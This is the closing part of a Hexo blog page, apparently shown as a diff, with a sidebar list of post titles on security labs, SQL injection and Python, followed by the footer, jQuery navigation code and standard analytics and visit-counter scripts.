class="post-list-link" href="/2019/05/21/untiy-yin-qing-you-xi-dian-jing-da-heng-ni-xiang/">Untiy引擎-游戏电竞大亨逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/basic-pentesting2-ba-ji-shen-tou/">Basic-pentesting2靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/Machine_matrix 渗透笔记/">Machine_matrix靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/2018总结/">2018的一个小总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/29/Python3多线程/">Python3多线程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/22/Web条件竞争利用/">Web条件竞争利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/11/Python3栅栏密码解密/">Python3栅栏密码解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/28/macos虚拟机安装/">虚拟机安装MacOS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/22/Python爬取steam优惠/">Python爬取steam优惠</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/13/Python3调用Google翻译/">Python3调用Google翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/18/2018kali更新源/">2018Kali可用更新源</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/12/CH4INRULZ_v1.0.1靶机攻略/">CH4INRULZ_v1.0.1靶机攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/31/“深海迷航” 为期两个星期的深海探险 完结/">“深海迷航” 为期两个星期的深海探险 完结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vulnhub TrollCave CTF靶机渗透/">JIS-CTF Vulnhub TrollCave CTF靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/29/JIS-CTF BOB靶机渗透笔记/">JIS-CTF BOB靶机渗透笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/JIS-CTF靶机渗透笔记/">JIS-CTF靶机渗透笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/14/JoomlaSQL注入（CVE-2018-8045）利用/">JoomlaSQL注入（CVE-2018-8045）利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/启动数据库/">Metsploit连接数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/metsploit获取电脑密码/">Metsploit破解hash</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/python日志/">Python学习日志</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/SQL injection/">SQL injection bypass WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/07/MS15-034漏洞模块利用/">MS15-034漏洞模块利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/SQLBypass技巧/">SQL注入Bypass技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/游戏旅行青蛙逆向破解/">游戏旅行青蛙逆向破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/突破WEB登陆/">突破web系统登录（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/Juice-Shop Windows平台搭建/">Juice-Shop Windows平台搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/02/OWASP Juice Shop v6.4.1部分题目答案（二）/">OWASP Juice Shop v6.4.1部分题目答案（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/31/OWASP Juice Shop v6.4.1部分题目答案/">OWASP Juice Shop v6.4.1部分题目答案</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/CentOS7安装Docker/">CentOS7安装Docker</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/python安装pip模块/">Python安装pip模块</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/利用SqlMap系统交互shell/">利用SqlMap系统交互shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Centos6.5安装kvm虚拟化/">Centos6.5安装kvm虚拟化</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/为各版本linux添加yum源/">为各版本linux添加yum源</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/NTFS 数据隐藏及恢复/">NTFS 数据隐藏及恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/FAT32 数据隐藏及恢复/">FAT32 数据隐藏及恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/Centos6.5下 PXE+Kickstart无人值守安装/">Centos6.5下 PXE+Kickstart无人值守安装</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Elapse
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
